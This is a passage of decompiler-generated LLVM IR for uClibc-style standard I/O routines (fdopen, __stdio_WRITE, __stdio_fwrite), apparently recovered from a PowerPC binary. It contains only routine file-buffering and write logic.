  %v0_10010074 = load i32, i32* @r5, align 4
  %v1_10010074 = load i32, i32* @r6, align 4
  %v3_10010074 = icmp ugt i32 %v0_10010074, %v1_10010074
  br i1 %v3_10010074, label %dec_label_pc_1001007c, label %dec_label_pc_10010080

dec_label_pc_1001007c:                            ; preds = %dec_label_pc_10010074
  store i32 %v1_10010074, i32* @r5, align 4
  br label %dec_label_pc_10010080

dec_label_pc_10010080:                            ; preds = %dec_label_pc_10010074, %dec_label_pc_1001007c
  %v0_1001008c = phi i32 [ %v0_10010074, %dec_label_pc_10010074 ], [ %v1_10010074, %dec_label_pc_1001007c ]
  %v1_10010080 = add i32 %v0_1001008c, 1
  store i32 %v1_10010080, i32* %r0.global-to-local, align 4
  %v0_10010084 = load i32, i32* @r4, align 4
  %v1_10010084 = inttoptr i32 %v0_10010084 to i32*
  %v2_10010084 = load i32, i32* %v1_10010084, align 4
  store i32 %v2_10010084, i32* %r11.global-to-local, align 4
  store i32 %v0_1001008c, i32* %r9.global-to-local, align 4
  store i32 %v0_1001008c, i32* %ctr.global-to-local, align 4
  %v2_100100bc3 = icmp eq i32 %v0_1001008c, 0
  br i1 %v2_100100bc3, label %dec_label_pc_100100c0, label %dec_label_pc_10010094.preheader

dec_label_pc_10010094.preheader:                  ; preds = %dec_label_pc_10010080
  %v1_1001009416 = inttoptr i32 %v2_10010084 to i32*
  %v2_1001009417 = load i32, i32* %v1_1001009416, align 4
  store i32 %v2_1001009417, i32* %r0.global-to-local, align 4
  %v1_1001009818 = add i32 %v2_10010084, 4
  store i32 %v1_1001009818, i32* %r11.global-to-local, align 4
  %v2_1001009c20 = icmp ugt i32 %v2_1001009417, 127
  br i1 %v2_1001009c20, label %dec_label_pc_10010054, label %dec_label_pc_100100a4.lr.ph

dec_label_pc_100100a4.lr.ph:                      ; preds = %dec_label_pc_10010094.preheader
  %extract.t = trunc i32 %v2_1001009417 to i8
  br label %dec_label_pc_100100a4

dec_label_pc_100100a4:                            ; preds = %dec_label_pc_100100a4.lr.ph, %dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge
  %v2_1001009423.off0 = phi i8 [ %extract.t, %dec_label_pc_100100a4.lr.ph ], [ %extract.t24, %dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge ]
  %v2_100100a422 = phi i32 [ %v2_100100a47, %dec_label_pc_100100a4.lr.ph ], [ %v2_100100b4, %dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge ]
  %v3_100100a4 = inttoptr i32 %v2_100100a422 to i8*
  store i8 %v2_1001009423.off0, i8* %v3_100100a4, align 1
  %v0_100100a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100100a8 = urem i32 %v0_100100a8, 256
  store i32 %v1_100100a8, i32* %r0.global-to-local, align 4
  %v3_100100ac = icmp eq i32 %v1_100100a8, 0
  br i1 %v3_100100ac, label %dec_label_pc_10010068, label %dec_label_pc_100100b4

dec_label_pc_100100b4:                            ; preds = %dec_label_pc_100100a4
  %v0_100100b4 = load i32, i32* @r3, align 4
  %v1_100100b4 = load i32, i32* @r10, align 4
  %v2_100100b4 = add i32 %v1_100100b4, %v0_100100b4
  store i32 %v2_100100b4, i32* @r3, align 4
  %v0_100100b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100100b8 = add i32 %v0_100100b8, -1
  store i32 %v1_100100b8, i32* %r9.global-to-local, align 4
  %v0_100100bc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100100bc = add i32 %v0_100100bc, -1
  store i32 %v1_100100bc, i32* %ctr.global-to-local, align 4
  %v2_100100bc = icmp eq i32 %v1_100100bc, 0
  br i1 %v2_100100bc, label %dec_label_pc_100100c0, label %dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge

dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge: ; preds = %dec_label_pc_100100b4
  %v0_10010094.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10010094 = inttoptr i32 %v0_10010094.pre to i32*
  %v2_10010094 = load i32, i32* %v1_10010094, align 4
  store i32 %v2_10010094, i32* %r0.global-to-local, align 4
  %v1_10010098 = add i32 %v0_10010094.pre, 4
  store i32 %v1_10010098, i32* %r11.global-to-local, align 4
  %v2_1001009c = icmp ugt i32 %v2_10010094, 127
  %extract.t24 = trunc i32 %v2_10010094 to i8
  br i1 %v2_1001009c, label %dec_label_pc_10010054, label %dec_label_pc_100100a4

dec_label_pc_100100c0:                            ; preds = %dec_label_pc_100100b4, %dec_label_pc_10010080, %dec_label_pc_10010068
  %v0_100100c4 = phi i32 [ %v0_100100c4.pre, %dec_label_pc_10010068 ], [ %v2_100100a47, %dec_label_pc_10010080 ], [ %v2_100100b4, %dec_label_pc_100100b4 ]
  %v2_100100c0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100100c0, i32* %r0.global-to-local, align 4
  %v4_100100c4 = icmp eq i32 %v0_100100c4, %v2_100100c0
  br i1 %v4_100100c4, label %dec_label_pc_100100d0, label %dec_label_pc_100100cc

dec_label_pc_100100cc:                            ; preds = %dec_label_pc_100100c0
  %v0_100100cc = load i32, i32* %r11.global-to-local, align 4
  %v1_100100cc = load i32, i32* @r4, align 4
  %v2_100100cc = inttoptr i32 %v1_100100cc to i32*
  store i32 %v0_100100cc, i32* %v2_100100cc, align 4
  br label %dec_label_pc_100100d0

dec_label_pc_100100d0:                            ; preds = %dec_label_pc_100100c0, %dec_label_pc_100100cc
  %v0_100100d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100100d0 = load i32, i32* @r5, align 4
  %v2_100100d0 = sub i32 %v1_100100d0, %v0_100100d0
  store i32 %v2_100100d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100100d4

dec_label_pc_100100d4:                            ; preds = %dec_label_pc_10010054, %dec_label_pc_100100d0
  %v0_100100d8 = phi i32 [ %v0_100100d8.pre, %dec_label_pc_10010054 ], [ %v2_100100d0, %dec_label_pc_100100d0 ]
  store i32 %v0_10010020, i32* %r0.global-to-local, align 4
  ret i32 %v0_100100d8

; uselistorder directives
  uselistorder i32 %v1_100100bc, { 1, 0 }
  uselistorder i32 %v2_100100b4, { 0, 2, 1 }
  uselistorder i32 %v1_100100a8, { 1, 0 }
  uselistorder i32 %v0_1001008c, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100100a47, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100100d4, { 1, 0 }
  uselistorder label %dec_label_pc_100100d0, { 1, 0 }
  uselistorder label %dec_label_pc_100100a4, { 1, 0 }
  uselistorder label %dec_label_pc_10010080, { 1, 0 }
  uselistorder label %dec_label_pc_10010074, { 2, 0, 1 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_100100ec = load i32, i32* @lr, align 4
  store i32 268501260, i32* @lr, align 4
  %v2_10010108 = call i32 @__libc_fcntl(i32 3, i32 3)
  %v3_1001010c = icmp eq i32 %v2_10010108, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_1001010c, label %dec_label_pc_10010134, label %dec_label_pc_10010120

dec_label_pc_10010120:                            ; preds = %entry
  store i32 %v0_100100ec, i32* @lr, align 4
  %v4_10010130 = inttoptr i32 %arg2 to i8*
  %v5_10010130 = call i32 @_stdio_fopen(i32 %v2_10010108, i8* %v4_10010130)
  br label %dec_label_pc_10010134

dec_label_pc_10010134:                            ; preds = %entry, %dec_label_pc_10010120
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10010134, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1001014c = load i32, i32* @lr, align 4
  store i32 %v0_1001014c, i32* %r0.global-to-local, align 4
  %v0_10010158 = load i32, i32* @r5, align 4
  store i32 %v0_10010158, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10010158, i32* @r31, align 4
  %v3_1001016c3 = icmp eq i32 %v0_10010158, 0
  store i32 %v0_10010158, i32* @r27, align 4
  br i1 %v3_1001016c3, label %dec_label_pc_10010214, label %dec_label_pc_1001017c

dec_label_pc_1001017c:                            ; preds = %entry, %dec_label_pc_1001019c
  %v0_1001018c = phi i32 [ %v2_1001019c, %dec_label_pc_1001019c ], [ %arg2, %entry ]
  %v1_1001017c.in = phi i32 [ %v2_100101a0, %dec_label_pc_1001019c ], [ %v0_10010158, %entry ]
  %v1_1001017c = icmp sgt i32 %v1_1001017c.in, 0
  br i1 %v1_1001017c, label %dec_label_pc_10010188, label %dec_label_pc_10010180

dec_label_pc_10010180:                            ; preds = %dec_label_pc_1001017c
  br label %dec_label_pc_10010188

dec_label_pc_10010188:                            ; preds = %dec_label_pc_1001017c, %dec_label_pc_10010180
  %v0_10010188 = load i32, i32* @r30, align 4
  %v1_10010188 = add i32 %v0_10010188, 4
  %v2_10010188 = inttoptr i32 %v1_10010188 to i32*
  %v3_10010188 = load i32, i32* %v2_10010188, align 4
  store i32 268501396, i32* @lr, align 4
  %v3_10010190 = call i32 @__libc_write(i32 %v3_10010188, i32 %v0_1001018c)
  %v1_10010194 = icmp slt i32 %v3_10010190, 0
  br i1 %v1_10010194, label %dec_label_pc_100101a8, label %dec_label_pc_1001019c

dec_label_pc_1001019c:                            ; preds = %dec_label_pc_10010188
  %v0_1001019c = load i32, i32* @r29, align 4
  %v2_1001019c = add i32 %v0_1001019c, %v3_10010190
  store i32 %v2_1001019c, i32* @r29, align 4
  %v1_100101a0 = load i32, i32* @r31, align 4
  %v2_100101a0 = sub i32 %v1_100101a0, %v3_10010190
  store i32 %v2_100101a0, i32* @r31, align 4
  %v3_1001016c = icmp eq i32 %v2_100101a0, 0
  store i32 %v2_100101a0, i32* @r27, align 4
  br i1 %v3_1001016c, label %dec_label_pc_1001016c.dec_label_pc_10010214.loopexit_crit_edge, label %dec_label_pc_1001017c

dec_label_pc_100101a8:                            ; preds = %dec_label_pc_10010188
  %v0_100101a8 = load i32, i32* @r30, align 4
  %v1_100101a8 = add i32 %v0_100101a8, 8
  %v2_100101a8 = inttoptr i32 %v1_100101a8 to i32*
  %v3_100101a8 = load i32, i32* %v2_100101a8, align 4
  store i32 %v3_100101a8, i32* %r11.global-to-local, align 4
  %v1_100101ac = add i32 %v0_100101a8, 12
  %v2_100101ac = inttoptr i32 %v1_100101ac to i32*
  %v3_100101ac = load i32, i32* %v2_100101ac, align 4
  store i32 %v3_100101ac, i32* %r0.global-to-local, align 4
  %v1_100101b0 = inttoptr i32 %v0_100101a8 to i16*
  %v2_100101b0 = load i16, i16* %v1_100101b0, align 2
  %v2_100101b4 = sub i32 %v3_100101ac, %v3_100101a8
  store i32 %v2_100101b4, i32* %r0.global-to-local, align 4
  %v5_100101b4 = icmp eq i32 %v2_100101b4, 0
  %v1_100101b8 = or i16 %v2_100101b0, 8
  store i16 %v1_100101b8, i16* %v1_100101b0, align 2
  br i1 %v5_100101b4, label %dec_label_pc_100101a8.dec_label_pc_10010210_crit_edge, label %dec_label_pc_100101c4

dec_label_pc_100101a8.dec_label_pc_10010210_crit_edge: ; preds = %dec_label_pc_100101a8
  %v0_10010210.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010210

dec_label_pc_100101c4:                            ; preds = %dec_label_pc_100101a8
  %v0_100101c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100101c4 = load i32, i32* @r31, align 4
  %v3_100101c4 = icmp ugt i32 %v0_100101c4, %v1_100101c4
  br i1 %v3_100101c4, label %dec_label_pc_100101c4.dec_label_pc_100101d0_crit_edge, label %dec_label_pc_100101cc

dec_label_pc_100101c4.dec_label_pc_100101d0_crit_edge: ; preds = %dec_label_pc_100101c4
  %v0_100101d0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_100101d0

dec_label_pc_100101cc:                            ; preds = %dec_label_pc_100101c4
  store i32 %v0_100101c4, i32* @r27, align 4
  br label %dec_label_pc_100101d0

dec_label_pc_100101d0:                            ; preds = %dec_label_pc_100101c4.dec_label_pc_100101d0_crit_edge, %dec_label_pc_100101cc
  %v0_100101d0 = phi i32 [ %v0_100101d0.pre, %dec_label_pc_100101c4.dec_label_pc_100101d0_crit_edge ], [ %v0_100101c4, %dec_label_pc_100101cc ]
  store i32 %v0_100101d0, i32* %ctr.global-to-local, align 4
  %v2_100101dc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100101d4

dec_label_pc_100101d4:                            ; preds = %dec_label_pc_100101f8, %dec_label_pc_100101d0
  %v2_100101dc = phi i32 [ %v1_100101f8, %dec_label_pc_100101f8 ], [ %v2_100101dc.pre, %dec_label_pc_100101d0 ]
  %v0_100101d4 = load i32, i32* @r29, align 4
  %v1_100101d4 = inttoptr i32 %v0_100101d4 to i8*
  %v2_100101d4 = load i8, i8* %v1_100101d4, align 1
  %v3_100101d4 = zext i8 %v2_100101d4 to i32
  store i32 %v3_100101d4, i32* %r0.global-to-local, align 4
  %v1_100101d8 = add i32 %v0_100101d4, 1
  store i32 %v1_100101d8, i32* @r29, align 4
  %v3_100101dc = inttoptr i32 %v2_100101dc to i8*
  store i8 %v2_100101d4, i8* %v3_100101dc, align 1
  %v0_100101e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100101e0 = urem i32 %v0_100101e0, 256
  store i32 %v1_100101e0, i32* %r0.global-to-local, align 4
  %v3_100101e4 = icmp eq i32 %v1_100101e0, 10
  br i1 %v3_100101e4, label %dec_label_pc_100101ec, label %dec_label_pc_100101f8

dec_label_pc_100101ec:                            ; preds = %dec_label_pc_100101d4
  %v0_100101ec = load i32, i32* @r30, align 4
  %v1_100101ec = inttoptr i32 %v0_100101ec to i16*
  %v2_100101ec = load i16, i16* %v1_100101ec, align 2
  %v3_100101ec = zext i16 %v2_100101ec to i32
  store i32 %v3_100101ec, i32* %r0.global-to-local, align 4
  %v1_100101f0 = and i32 %v3_100101ec, 256
  %v3_100101f0 = icmp eq i32 %v1_100101f0, 0
  br i1 %v3_100101f0, label %dec_label_pc_100101f8, label %dec_label_pc_100101ec.dec_label_pc_10010200_crit_edge

dec_label_pc_100101ec.dec_label_pc_10010200_crit_edge: ; preds = %dec_label_pc_100101ec
  %v0_10010204.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010200

dec_label_pc_100101f8:                            ; preds = %dec_label_pc_100101ec, %dec_label_pc_100101d4
  %v0_100101f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100101f8 = add i32 %v0_100101f8, 1
  store i32 %v1_100101f8, i32* %r11.global-to-local, align 4
  %v0_100101fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100101fc = add i32 %v0_100101fc, -1
  store i32 %v1_100101fc, i32* %ctr.global-to-local, align 4
  %v2_100101fc = icmp eq i32 %v1_100101fc, 0
  br i1 %v2_100101fc, label %dec_label_pc_100101f8.dec_label_pc_10010200_crit_edge, label %dec_label_pc_100101d4

dec_label_pc_100101f8.dec_label_pc_10010200_crit_edge: ; preds = %dec_label_pc_100101f8
  %v0_10010200.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10010200

dec_label_pc_10010200:                            ; preds = %dec_label_pc_100101ec.dec_label_pc_10010200_crit_edge, %dec_label_pc_100101f8.dec_label_pc_10010200_crit_edge
  %v0_10010204 = phi i32 [ %v1_100101f8, %dec_label_pc_100101f8.dec_label_pc_10010200_crit_edge ], [ %v0_10010204.pre, %dec_label_pc_100101ec.dec_label_pc_10010200_crit_edge ]
  %v0_10010200 = phi i32 [ %v0_10010200.pre, %dec_label_pc_100101f8.dec_label_pc_10010200_crit_edge ], [ %v0_100101ec, %dec_label_pc_100101ec.dec_label_pc_10010200_crit_edge ]
  %v1_10010200 = add i32 %v0_10010200, 8
  %v2_10010200 = inttoptr i32 %v1_10010200 to i32*
  %v3_10010200 = load i32, i32* %v2_10010200, align 4
  store i32 %v3_10010200, i32* %r0.global-to-local, align 4
  %v2_10010204 = add i32 %v0_10010200, 16
  %v3_10010204 = inttoptr i32 %v2_10010204 to i32*
  store i32 %v0_10010204, i32* %v3_10010204, align 4
  %v0_10010208 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010208 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010208 = sub i32 %v1_10010208, %v0_10010208
  store i32 %v2_10010208, i32* %r0.global-to-local, align 4
  %v1_1001020c = load i32, i32* @r31, align 4
  %v2_1001020c = sub i32 %v1_1001020c, %v2_10010208
  store i32 %v2_1001020c, i32* @r31, align 4
  br label %dec_label_pc_10010210

dec_label_pc_10010210:                            ; preds = %dec_label_pc_100101a8.dec_label_pc_10010210_crit_edge, %dec_label_pc_10010200
  %v0_10010210 = phi i32 [ %v0_10010210.pre, %dec_label_pc_100101a8.dec_label_pc_10010210_crit_edge ], [ %v2_1001020c, %dec_label_pc_10010200 ]
  %v1_10010210 = load i32, i32* @r28, align 4
  %v2_10010210 = sub i32 %v1_10010210, %v0_10010210
  store i32 %v2_10010210, i32* @r28, align 4
  br label %dec_label_pc_10010214

dec_label_pc_1001016c.dec_label_pc_10010214.loopexit_crit_edge: ; preds = %dec_label_pc_1001019c
  %v0_10010218.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10010214

dec_label_pc_10010214:                            ; preds = %entry, %dec_label_pc_1001016c.dec_label_pc_10010214.loopexit_crit_edge, %dec_label_pc_10010210
  %v0_10010218 = phi i32 [ %v2_10010210, %dec_label_pc_10010210 ], [ %v0_10010218.pre.pre, %dec_label_pc_1001016c.dec_label_pc_10010214.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1001014c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010218

; uselistorder directives
  uselistorder i32 %v0_10010200, { 1, 0 }
  uselistorder i32 %v1_100101fc, { 1, 0 }
  uselistorder i32 %v1_100101f8, { 0, 2, 1 }
  uselistorder i32 %v1_100101e0, { 1, 0 }
  uselistorder i32 %v2_100101a0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1001019c, { 1, 0 }
  uselistorder i32 %v3_10010190, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 6, 15, 14, 13, 16, 12, 11, 0, 4, 1, 5, 2, 10, 9, 8, 3, 7 }
  uselistorder label %dec_label_pc_10010214, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010210, { 1, 0 }
  uselistorder label %dec_label_pc_10010200, { 1, 0 }
  uselistorder label %dec_label_pc_100101d0, { 1, 0 }
  uselistorder label %dec_label_pc_10010188, { 1, 0 }
  uselistorder label %dec_label_pc_1001017c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1001022c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_10010248 = load i16, i16* %arg3, align 2
  %v1_1001024c = and i16 %v3_10010248, 512
  %v3_1001024c = icmp eq i16 %v1_1001024c, 0
  br i1 %v3_1001024c, label %dec_label_pc_10010254, label %dec_label_pc_10010360

dec_label_pc_10010254:                            ; preds = %entry
  %v2_10010254 = add i32 %tmp, 4
  %v3_10010254 = inttoptr i32 %v2_10010254 to i32*
  %v4_10010254 = load i32, i32* %v3_10010254, align 4
  %v2_10010258 = add i32 %tmp, 16
  %v3_10010258 = inttoptr i32 %v2_10010258 to i32*
  %v4_10010258 = load i32, i32* %v3_10010258, align 4
  store i32 %v4_10010258, i32* @r3, align 4
  %v3_1001025c = icmp eq i32 %v4_10010254, -2
  %v2_10010260 = add i32 %tmp, 12
  %v3_10010260 = inttoptr i32 %v2_10010260 to i32*
  %v4_10010260 = load i32, i32* %v3_10010260, align 4
  %v2_10010268 = sub i32 %v4_10010260, %v4_10010258
  br i1 %v3_1001025c, label %dec_label_pc_10010268, label %dec_label_pc_10010298

dec_label_pc_10010268:                            ; preds = %dec_label_pc_10010254
  %v3_10010270 = icmp ult i32 %v2_10010268, %arg2
  br i1 %v3_10010270, label %dec_label_pc_10010278, label %dec_label_pc_1001027c

dec_label_pc_10010278:                            ; preds = %dec_label_pc_10010268
  br label %dec_label_pc_1001027c

dec_label_pc_1001027c:                            ; preds = %dec_label_pc_10010268, %dec_label_pc_10010278
  %storemerge = phi i32 [ %v2_10010268, %dec_label_pc_10010278 ], [ %arg2, %dec_label_pc_10010268 ]
  %v0_10010280 = phi i32 [ %v2_10010268, %dec_label_pc_10010278 ], [ %arg2, %dec_label_pc_10010268 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10010280, i32* @r5, align 4
  store i32 268501640, i32* @lr, align 4
  %v0_10010284 = call i32 @memcpy()
  %v0_10010288 = load i32, i32* @r30, align 4
  %v1_10010288 = add i32 %v0_10010288, 16
  %v2_10010288 = inttoptr i32 %v1_10010288 to i32*
  %v3_10010288 = load i32, i32* %v2_10010288, align 4
  %v1_1001028c = load i32, i32* @r31, align 4
  %v2_1001028c = add i32 %v1_1001028c, %v3_10010288
  store i32 %v2_1001028c, i32* %v2_10010288, align 4
  br label %dec_label_pc_10010380

dec_label_pc_10010298:                            ; preds = %dec_label_pc_10010254
  %v3_1001029c = icmp ult i32 %v2_10010268, %arg2
  br i1 %v3_1001029c, label %dec_label_pc_1001033c, label %dec_label_pc_100102a4

dec_label_pc_100102a4:                            ; preds = %dec_label_pc_10010298
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268501680, i32* @lr, align 4
  %v0_100102ac = call i32 @memcpy()
  %v0_100102b0 = load i32, i32* @r30, align 4
  %v1_100102b0 = inttoptr i32 %v0_100102b0 to i16*
  %v2_100102b0 = load i16, i16* %v1_100102b0, align 2
  %v1_100102b4 = add i32 %v0_100102b0, 16
  %v2_100102b4 = inttoptr i32 %v1_100102b4 to i32*
  %v3_100102b4 = load i32, i32* %v2_100102b4, align 4
  %v1_100102b8 = and i16 %v2_100102b0, 256
  %v3_100102b8 = icmp eq i16 %v1_100102b8, 0
  %v1_100102bc = load i32, i32* @r29, align 4
  %v2_100102bc = add i32 %v1_100102bc, %v3_100102b4
  store i32 %v2_100102bc, i32* %v2_100102b4, align 4
  br i1 %v3_100102b8, label %dec_label_pc_10010380, label %dec_label_pc_100102c8

dec_label_pc_100102c8:                            ; preds = %dec_label_pc_100102a4
  %v0_100102c8 = load i32, i32* @r28, align 4
  %v0_100102d0 = load i32, i32* @r29, align 4
  store i32 268501720, i32* @lr, align 4
  %v4_100102d4 = call i32 @memrchr(i32 %v0_100102c8, i32 10, i32 %v0_100102d0, i32 %v2_100102bc)
  %v3_100102d8 = icmp eq i32 %v4_100102d4, 0
  br i1 %v3_100102d8, label %dec_label_pc_10010380, label %dec_label_pc_100102e0

dec_label_pc_100102e0:                            ; preds = %dec_label_pc_100102c8
  %v0_100102e0 = load i32, i32* @r30, align 4
  store i32 %v0_100102e0, i32* @r3, align 4
  store i32 268501736, i32* @lr, align 4
  %v0_100102e4 = call i32 @__stdio_wcommit()
  %v3_100102e8 = icmp eq i32 %v0_100102e4, 0
  br i1 %v3_100102e8, label %dec_label_pc_10010380, label %dec_label_pc_100102f0

dec_label_pc_100102f0:                            ; preds = %dec_label_pc_100102e0
  %v0_100102f0 = load i32, i32* @r29, align 4
  %v3_100102f0 = icmp ugt i32 %v0_100102f0, %v0_100102e4
  %v0_100102e4.v0_100102f4 = select i1 %v3_100102f0, i32 %v0_100102e4, i32 %v0_100102f0
  store i32 %v0_100102e4.v0_100102f4, i32* @r31, align 4
  %v2_10010300 = sub i32 %v0_100102f0, %v0_100102e4.v0_100102f4
  %v0_10010308 = load i32, i32* @r28, align 4
  %v2_10010308 = add i32 %v0_10010308, %v2_10010300
  store i32 %v2_10010308, i32* @r28, align 4
  store i32 %v2_10010308, i32* @r3, align 4
  store i32 268501784, i32* @lr, align 4
  %v3_10010314 = call i32 @__GI_memchr(i32 %v2_10010308, i32 10, i32 %v0_100102e4.v0_100102f4)
  %v3_10010318 = icmp eq i32 %v3_10010314, 0
  br i1 %v3_10010318, label %dec_label_pc_10010380, label %dec_label_pc_10010320

dec_label_pc_10010320:                            ; preds = %dec_label_pc_100102f0
  %v0_10010320 = load i32, i32* @r30, align 4
  %v1_10010320 = add i32 %v0_10010320, 16
  %v2_10010320 = inttoptr i32 %v1_10010320 to i32*
  %v3_10010320 = load i32, i32* %v2_10010320, align 4
  %v0_10010324 = load i32, i32* @r28, align 4
  %v1_10010324 = load i32, i32* @r31, align 4
  %v2_10010324 = sub i32 %v0_10010324, %v3_10010314
  %v2_10010328 = add i32 %v2_10010324, %v1_10010324
  %v2_1001032c = sub i32 %v3_10010320, %v2_10010328
  %v1_10010330 = load i32, i32* @r29, align 4
  %v2_10010330 = sub i32 %v1_10010330, %v2_10010328
  store i32 %v2_10010330, i32* @r29, align 4
  store i32 %v2_1001032c, i32* %v2_10010320, align 4
  br label %dec_label_pc_10010380

dec_label_pc_1001033c:                            ; preds = %dec_label_pc_10010298
  %v2_1001033c = add i32 %tmp, 8
  %v3_1001033c = inttoptr i32 %v2_1001033c to i32*
  %v4_1001033c = load i32, i32* %v3_1001033c, align 4
  %v4_10010340 = icmp eq i32 %v4_10010258, %v4_1001033c
  br i1 %v4_10010340, label %dec_label_pc_10010360, label %dec_label_pc_10010348

dec_label_pc_10010348:                            ; preds = %dec_label_pc_1001033c
  store i32 %tmp, i32* @r3, align 4
  store i32 268501840, i32* @lr, align 4
  %v0_1001034c = call i32 @__stdio_wcommit()
  %v3_10010350 = icmp eq i32 %v0_1001034c, 0
  br i1 %v3_10010350, label %dec_label_pc_10010348.dec_label_pc_10010360_crit_edge, label %dec_label_pc_10010358

dec_label_pc_10010348.dec_label_pc_10010360_crit_edge: ; preds = %dec_label_pc_10010348
  %v0_10010364.pre = load i32, i32* @r30, align 4
  %v0_10010368.pre = load i32, i32* @r28, align 4
  %v0_1001036c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010360

dec_label_pc_10010358:                            ; preds = %dec_label_pc_10010348
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10010380

dec_label_pc_10010360:                            ; preds = %dec_label_pc_10010348.dec_label_pc_10010360_crit_edge, %entry, %dec_label_pc_1001033c
  %v0_1001036c = phi i32 [ %v0_1001036c.pre, %dec_label_pc_10010348.dec_label_pc_10010360_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1001033c ]
  %v0_10010368 = phi i32 [ %v0_10010368.pre, %dec_label_pc_10010348.dec_label_pc_10010360_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1001033c ]
  %v0_10010364 = phi i32 [ %v0_10010364.pre, %dec_label_pc_10010348.dec_label_pc_10010360_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1001033c ]
  %v1_10010364 = inttoptr i32 %v0_10010364 to i16*
  store i32 %v0_1001036c, i32* @r5, align 4
  store i32 %v0_1001022c, i32* @lr, align 4
  %v5_1001037c = call i32 @__stdio_WRITE(i16* %v1_10010364, i32 %v0_10010368)
  br label %dec_label_pc_10010380

dec_label_pc_10010380:                            ; preds = %dec_label_pc_100102f0, %dec_label_pc_100102e0, %dec_label_pc_100102c8, %dec_label_pc_100102a4, %dec_label_pc_10010358, %dec_label_pc_10010320, %dec_label_pc_1001027c, %dec_label_pc_10010360
  %v0_10010384 = load i32, i32* @r29, align 4
  ret i32 %v0_10010384

; uselistorder directives
  uselistorder i32 %v2_10010328, { 1, 0 }
  uselistorder i32 %v0_100102e4.v0_100102f4, { 0, 2, 1 }
  uselistorder i32 %v0_100102f0, { 1, 0, 2 }
  uselistorder i32 %v2_10010268, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10010380, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10010360, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001027c, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10010398 = load i32, i32* @lr, align 4
  store i32 %v0_10010398, i32* %r0.global-to-local, align 4
  %v0_100103a0 = load i32, i32* @r31, align 4
  %v0_100103a4 = load i32, i32* @r3, align 4
  store i32 %v0_100103a4, i32* @r31, align 4
  %v1_100103ac = inttoptr i32 %v0_100103a4 to i16*
  %v2_100103ac = load i16, i16* %v1_100103ac, align 2
  %v3_100103ac = zext i16 %v2_100103ac to i32
  store i32 %v3_100103ac, i32* %r0.global-to-local, align 4
